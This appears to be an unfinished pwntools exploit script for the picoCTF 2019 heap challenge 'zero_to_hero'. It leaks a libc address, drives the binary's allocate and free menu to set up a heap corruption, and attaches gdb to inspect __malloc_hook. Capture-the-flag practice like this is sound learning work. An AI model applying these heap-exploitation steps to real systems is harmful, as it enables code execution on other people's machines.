from pwn import *

e = ELF("./zero_to_hero")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("2019shell1.picoctf.com", 49928)
else:
  p = process(e.path, aslr=False,
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil("?")
p.sendline("y")

p.recvuntil("0x")
leak = int(p.recvline(), 16) - libc.symbols["system"]
print("{:#x}".format(leak))

idx = 0
def alloc(size, pay="AAAA"):
  global idx
    
  p.sendline("1")
  p.sendlineafter(">", str(size))
  p.sendafter(">", pay if len(pay) == size else pay + "\n")
  p.recvuntil(">")

  ret = idx
  idx += 1
  return ret

def free(idx):
  p.sendline("2")
  p.sendlineafter(">", str(idx))
  p.recvuntil(">")

p.recvuntil(">")

A = alloc(0x408, "A" * 0x408)

free(A)
alloc(0x408)
alloc(0x408)
gdb.attach(p, "x/20gx {:#x}".format(leak + libc.symbols["__malloc_hook"]))

p.interactive()
